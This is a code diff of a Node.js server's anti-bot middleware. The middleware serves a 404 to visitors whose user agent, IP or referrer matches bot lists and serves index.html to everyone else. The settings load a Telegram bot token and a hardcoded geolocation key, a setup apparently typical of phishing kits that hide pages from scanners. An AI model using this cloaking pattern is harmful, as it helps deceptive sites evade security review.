@@ -6,7 +6,6 @@ const { botToken, chatId } = require('./Config/settings.js');
 const { sendMessageFor } = require('simple-telegram-message');
 const isbot = require('isbot');
 const ipRangeCheck = require('ip-range-check');
-const requestIP = require('request-ip');
 const axios = require('axios');
 const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
 const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
@@ -14,9 +13,10 @@ const { getClientIp } = require('request-ip');
 const { botUAList } = require('./Config/botUA.js');
 const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./Config/botIP.js');
 const { botRefList } = require('./Config/botRef.js');
+const fs = require('fs').promises; 
 
 // Middleware function for bot detection
-function antiBotMiddleware(req, res, next) {
+async function antiBotMiddleware(req, res, next) {
     const clientUA = req.headers['user-agent'] || req.get('user-agent');
     const clientIP = getClientIp(req);
     const clientRef = req.headers.referer || req.headers.origin;
@@ -25,7 +25,7 @@ function antiBotMiddleware(req, res, next) {
         // It's a bot, return a 404 response or handle it as needed
         return res.status(404).send('Not Found');
     } else {
-        // It's not a bot, serve the index.html page
+       
         res.sendFile(path.join(__dirname, 'index.html'));
     }
 }
